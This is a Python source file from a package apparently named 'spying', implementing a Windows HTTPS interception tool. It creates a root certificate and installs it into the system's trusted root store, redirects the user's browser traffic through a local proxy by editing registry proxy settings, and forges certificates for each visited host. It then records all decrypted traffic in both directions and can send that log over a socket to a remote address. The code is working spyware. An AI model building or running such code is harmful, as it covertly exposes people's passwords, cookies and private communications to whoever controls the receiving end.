from __future__ import annotations

from functools import lru_cache
import logging
import os
import warnings
from pathlib import Path
import OpenSSL

# os.environ['PYTHONASYNCIODEBUG'] = '1'
# logging.basicConfig(level=logging.DEBUG)
# warnings.resetwarnings()

import subprocess

from spying.consts import *
import random
import ssl
from typing import Tuple, Optional, TextIO, Union
from mitm import MITM, middleware, Connection, protocol, __data__
# from network import send
from socket import socket
# import sys
import winreg
from asyncio import CancelledError
import pathlib
# import certifi
from OpenSSL import crypto as cry

from network import send

my_socket: Optional[socket] = None
file: Optional[TextIO] = None
mitm: Optional[MITM] = None
MITM_PORT = 12889
installed_hosts = {}
ca_cert: cry.X509 | None = None
ca_key: cry.PKey | None = None


def create_root_using_python(ca_path: str, country: str | None = "Is", state: str | None = PROJECT_NAME,
                                   organiztion: str | None = PROJECT_NAME, common_name: str = PROJECT_NAME):
    global ca_cert
    global ca_key

    ca_key = OpenSSL.crypto.PKey()
    ca_key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)

    ca_cert = OpenSSL.crypto.X509()
    ca_cert.get_subject().C = country
    ca_cert.get_subject().ST = state
    ca_cert.get_subject().L = state
    ca_cert.get_subject().O = organiztion
    ca_cert.get_subject().OU = organiztion
    ca_cert.get_subject().CN = common_name
    ca_cert.set_serial_number(random.randint(0, 2 ** 64 - 1))
    ca_cert.set_version(2)
    ca_cert.gmtime_adj_notBefore(0)
    ca_cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
    ca_cert.set_issuer(ca_cert.get_subject())

    # Creates CA.
    ca_cert.set_pubkey(ca_key)
    ca_cert.add_extensions(
        [
            OpenSSL.crypto.X509Extension(b"basicConstraints", True, b"CA:TRUE, pathlen:0"),
            OpenSSL.crypto.X509Extension(b"keyUsage", True, b"keyCertSign, cRLSign"),
            OpenSSL.crypto.X509Extension(b"subjectKeyIdentifier", False, b"hash", subject=ca_cert),
        ],
    )
    ca_cert.sign(ca_key, "sha256")


    # Save certificate
    with open(f"{ca_path}.crt", "wb") as f:
        f.write(cry.dump_certificate(cry.FILETYPE_PEM, ca_cert))

    # Save private key
    with open(f"{ca_path}.key", "wb") as f:
        f.write(cry.dump_privatekey(cry.FILETYPE_PEM, ca_key))

    os.system(f"certutil -addstore root {ca_path}.crt")


@lru_cache(maxsize=1024)
def new_context_using_python(host: str):
    # Generates cert/key for the host.
    # Generate a new key pair.
    key = OpenSSL.crypto.PKey()
    key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)


    # Generates new X509Request.
    req = OpenSSL.crypto.X509Req()
    req.get_subject().CN = host.encode("utf-8")
    req.set_pubkey(key)
    req.sign(key, "sha256")

    # Generates new X509 certificate.
    cert = OpenSSL.crypto.X509()
    cert.set_serial_number(random.randint(0, 2 ** 64 - 1))
    cert.set_version(2)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(1 * (365 * 24 * 60 * 60))
    cert.set_subject(ca_cert.get_subject())
    cert.get_subject().CN = host
    cert.set_issuer(ca_cert.get_subject())
    cert.set_pubkey(req.get_pubkey())

    # Sets the certificate 'subjectAltName' extension.
    hosts = [f"DNS:{host}"]

    # if False:
    #     hosts += [f"IP:{host}"]
    # else:
    hosts += [f"DNS:*.{host}"]

    hosts = ", ".join(hosts).encode("utf-8")
    cert.add_extensions([OpenSSL.crypto.X509Extension(b"subjectAltName", False, hosts)])

    # Signs the certificate with the CA's key.
    cert.sign(ca_key, "sha256")


    # Dump the cert and key.
    cert_dump = OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)
    key_dump = OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, key)


    host_path = f"{CERT_FOLDER}\\{host}"
    cert_path, key_path = Path(f"{host_path}.crt"), Path(f"{host_path}.key")
    cert_path.parent.mkdir(parents=True, exist_ok=True)
    with cert_path.open("wb") as f:
        f.write(cert_dump)
    key_path.parent.mkdir(parents=True, exist_ok=True)
    with key_path.open("wb") as f:
        f.write(key_dump)

    # Creates new SSLContext.
    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
    context.load_cert_chain(certfile=cert_path, keyfile=key_path)

    # Remove the temporary files.
    cert_path.unlink()
    key_path.unlink()

    return context



async def create_root(ca_path: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME,
                      common_name=PROJECT_NAME):
    """
    creates the root certificate and install it to the OP
    """
    pathlib.Path(ca_path).parent.mkdir(parents=True, exist_ok=True)
    # os.system(f'openssl genrsa -out "{ca_path}.key" 4096')
    # os.system(f'openssl req -x509 -new -nodes -key "{ca_path}.key" -sha256 -days 1024 '
    #           f'-subj "/C={country}/ST={state}/O={organiztion}/CN={common_name}" -out "{ca_path}.crt"')
    # os.system(f'certutil -addstore root "{ca_path}.crt"')
    subprocess.run([OPENSSL_PATH, "genrsa", "-out", f"{ca_path}.key", "4096"])
    subprocess.run(
        [OPENSSL_PATH, "req", "-x509", "-new", "-nodes", "-key", f"{ca_path}.key", "-sha256", "-days", "1024",
         '-subj', f"/C={country}/ST={state}/O={organiztion}/CN={common_name}", "-out", f"{ca_path}.crt"])
    subprocess.run(['certutil', "-addstore", "root", f"{ca_path}.crt"])


async def new_pair2(host: str, country: str = "Is", state: str = PROJECT_NAME, organiztion: str = PROJECT_NAME):
    ca_path = f"{CERT_FOLDER}\\{ROOT_CA_NAME}"
    host_path = f"{CERT_FOLDER}\\{host}"
    with open(f"{host_path}.conf", "wt") as f:
        f.write(f"[req]\n"
                f"default_bits = 2048\n"
                f"prompt = no\n"
                f"default_md = sha256\n"
                f"req_extensions = req_ext\n"
                f"distinguished_name = dn\n"
                f"[dn]\n"
                f"C = {country}\n"
                f"ST = {state}\n"
                f"O = {organiztion}\n"
                f"emailAddress = flikhamud123@gmail.com\n"
                f"CN = {host}\n"
                f"[req_ext]\n"
                f"subjectAltName = @alt_names\n"
                f"[alt_names]\n"
                f"DNS.1 = {host}")

    # os.system(f'openssl genrsa -out "{host_path}.key" 2048')
    # os.system(f'openssl req -new -sha256 -key "{host_path}.key" '
    #           f'-subj "/C={country}/ST={state}/O={organiztion}/CN={host}" '
    #           f'-config "{host_path}.conf" '
    #           f'-out "{host_path}.csr"')
    subprocess.run([OPENSSL_PATH, "genrsa", "-out", f"{host_path}.key", "2048"])
    subprocess.run([OPENSSL_PATH, "req", "-new", "-sha256", "-key", f"{host_path}.key",
                    "-subj", f"/C={country}/ST={state}/O={organiztion}/CN={host}",
                    '-config', f"{host_path}.conf",
                    '-out', f"{host_path}.csr"])

    # os.system(f'openssl req -out "{host_path}.csr" -newkey rsa:2048 -nodes -keyout "{host_path}.key" -config "{host_path}.conf"')
    # os.system(f'openssl req -noout -text -in "{host_path}.csr"')
    # os.system(f"openssl req -in {host}.csr -noout -text")


    # os.system(f'openssl x509 -req -in "{host_path}.csr" '
    #           f'-CA "{ca_path}.crt" -CAkey "{ca_path}.key" -CAcreateserial -out "{host_path}.crt" -days 500 -sha256 '
    #           f'-extfile "{host_path}.conf" '
    #           f'-extensions req_ext'
    #           )
    subprocess.run([OPENSSL_PATH, "x509", "-req", "-in", f"{host_path}.csr",
                    '-CA', f"{ca_path}.crt", "-CAkey", f"{ca_path}.key", "-CAcreateserial", "-out", f"{host_path}.crt",
                    "-days", "500", "-sha256",
                    '-extfile', f"{host_path}.conf",
                    '-extensions', "req_ext"
                    ])
    a=5

    # os.system(f"openssl x509 -in {host_path}.crt -text -noout")


async def create_crypto2(host: str):
    context = new_context_using_python(host)
    installed_hosts[host] = context


async def start_connection(connection: Connection, data):
    # # print("what")
    if b"CONNECT" in data:
        # print("whatttt")
        host = str(data[data.find(b" ") + 1: data.find(b":")])[2:-1]
        # print("OK")
    else:
        return
    # # print("Wow")
    if host not in installed_hosts:
        await create_crypto2(host)
    connection.ssl_context = installed_hosts[host]


class HttpsLogger(middleware.Middleware):
    """
    abstract class for saving the info of the MITM and verify the certificates
    """
    @classmethod
    async def mitm_started(cls, host: str, port: int):
        await cls.write(f"MITM started on {host}:{port}.\n")
        # print("MITM started on %s:%d.\n" % (host, port))
        folder = Path(CERT_FOLDER)
        folder.mkdir(parents=True, exist_ok=True)
        ca_path = f"{CERT_FOLDER}\\{ROOT_CA_NAME}"
        create_root_using_python(ca_path)
        # await create_root(f"{CERT_FOLDER}\\{ROOT_CA_NAME}")

    @classmethod
    async def client_connected(cls, connection: Connection):
        host, port = connection.client.writer._transport.get_extra_info("peername")
        await cls.write(f"Client {host}:{port} has connected.\n")
        # print("Client %s:%i has connected.\n" % (host, port))

    @classmethod
    async def server_connected(cls, connection: Connection):
        host, port = connection.server.writer._transport.get_extra_info("peername")
        await cls.write(f"Connected to server {host}:{port}.\n")

        # print("Connected to server %s:%i.\n" % (host, port))

    @classmethod
    async def client_data(cls, connection: Connection, data: bytes) -> bytes:
        await cls.write(f"Client to server: \n\n\t{data}\n")
        # print("Client to server: \n\n\t%s\n" % data)
        # # print("what")
        if b"CONNECT" in data:
            # print("whatttt")
            host = str(data[data.find(b" ") + 1: data.find(b":")])[2:-1]
            # print("OK")
            # # print("Wow")
            if host not in installed_hosts:
                await create_crypto2(host)
            connection.ssl_context = installed_hosts[host]
        else:
            if connection.ssl_context not in installed_hosts.values():
                print("What?!")
        return data

    @classmethod
    async def server_data(cls, connection: Connection, data: bytes) -> bytes:
        await cls.write(f"Server to client: \n\n\t{data}\n")
        # print("Server to client: \n\n\t%s\n" % data)
        return data

    @classmethod
    async def client_disconnected(cls, connection: Connection):
        await cls.write("Client has disconnected.\n")
        # # print("Client has disconnected.\n")

    @classmethod
    async def server_disconnected(cls, connection: Connection):
        await cls.write("Server has disconnected.")
        # # print("Server has disconnected.")

    @staticmethod
    async def write(info: str):
        raise NotImplementedError


class FileLog(HttpsLogger):
    @staticmethod
    async def write(info: str):
        print(info)
        file.write(info)


class NetLog(HttpsLogger):
    @staticmethod
    async def write(info: str):
        try:
            send(info, my_socket)
        except Exception:
            exit(0)


def set_reg(name, value, size):
    """
    update value in the registry.
    return whether succeeded or not
    """
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      "Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, size, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError as e:
        # print(e)
        return False


def install_cert(host: str | None = None):
    if not host:
        return
    path = __data__.joinpath(f"mitm.crt") if not host else host
    os.system(fr"powershell -c Import-Certificate -FilePath '{path}' -CertStoreLocation Cert:\LocalMachine\Root")


def __filestart(path: str, address: Tuple[str, int]) -> bool:
    """
    starts MITM and save to file
    """
    global file
    try:
        if file or my_socket:
            return False
        file = open(path, "wt")

        return __start(address)
    finally:
        file.close()
        set_reg("ProxyEnable", 0, winreg.REG_DWORD)


def __netstart(address) -> bool:
    """
    starts MITM and send on net
    """
    global my_socket
    try:
        if file or my_socket:
            return False
        my_socket = socket()
        print(f"connecting to: {address}")
        my_socket.connect(address)
        return __start(address)
    finally:
        my_socket.close()
        set_reg("ProxyEnable", 0, winreg.REG_DWORD)


def __start(address) -> bool:
    """
    starts the MITM
    """
    global mitm
    if my_socket and file:
        return False
    logger: Optional[type(middleware.Middleware)] = None
    if my_socket:
        logger = NetLog
    elif file:
        logger = FileLog
    else:
        return False

    # os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1')
    # sys.stdout.write("yes")
    # set the proxy:
    if not set_reg("ProxyEnable", 1, winreg.REG_DWORD):
        return False
    # os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8888')
    # sys.stdout.write("yes")
    if not set_reg("ProxyServer", f"127.0.0.1:{MITM_PORT}", winreg.REG_SZ):
        return False
    if not set_reg("ProxyOverride", f"<local>;{address[0]}", winreg.REG_SZ):
        return False
    mitm = MITM(middlewares=[logger],
                host="127.0.0.1",
                port=MITM_PORT,
                protocols=[protocol.HTTP],
                buffer_size=8192,
                timeout=5,
                ssl_context=None)
    try:
        mitm.run()
    except CancelledError:
        pass
        # print("Wow")
    return True


if __name__ == "__main__":
    __filestart("logger.txt", ("127.0.0.1", 4))
